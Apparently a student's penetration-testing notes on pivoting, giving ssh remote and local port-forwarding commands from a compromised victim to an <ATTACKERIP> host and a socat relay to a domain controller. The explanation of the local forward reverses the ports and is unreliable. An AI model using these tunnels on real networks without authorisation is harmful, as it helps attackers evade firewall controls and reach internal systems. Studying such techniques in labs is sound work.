Most of the lateral movement techniques we have presented require specific ports to be available for an attacker. In real-world networks, the administrators may have blocked some of these ports for security reasons.

**SSH Tunnelling:**

```SSH``` already has built-in functionality to do port forwarding through a feature called SSH Tunneling. We will start a tunnel from the controlled victem machine, acting as an SSH client, to the Attacker's PC, which will act as an SSH server.

Since we'll be making a connection back to our attacker's machine, we'll want to create a user
```
useradd tunneluser -m -d /home/tunneluser -s /bin/true
passwd tunneluser
```
**First type: SSH Remote Port Forwarding**

It's allows you to take a reachable port from the SSH client (in this case, the controlled victem machine) and project it into a remote SSH server (the attacker's machine). in other words, if we could not reach the target machine(Domain controller) via port 1111 due to the firewall, By doing *SSH Remote Port Forwarding* we could reach to the target via the controlled victem machine via any choosen port.
```
C:\> ssh tunneluser@<ATTACKERIP> -R 3389:<DOMAIN_CONTROLLER>:1111 -N     # this command will be run in the controlled victem machine cuz this machine can reach the target via 1111 port while the attacher machine can not.
```

**Second type: SSH Local Port Forwarding**

It's allows us to "pull" a port from an SSH server into the SSH client. In our scenario, this could be used to take any service available in our attacker's machine and make it available through a port on controlled victem machine. That way, any host that can't connect directly to the attacker's PC but can connect to controlled victem machine will now be able to reach the attacker's services through the pivot host.<br>
In other words, If any machine access the controlled victem machine via {123} port it will make them access the attacker machine's {101} port. 
```
C:\> ssh tunneluser@<ATTACKERIP> -L *:101:127.0.0.1:123 -N
```

**Port Forwarding With socat**

```
socat TCP4-LISTEN:1234,fork TCP4:<DOMAIN_CONTROLLER>:4321
```
If the controlled victem machine recieved any connections via 1234 port, it will redirect these connections to the DC's 4321 port.










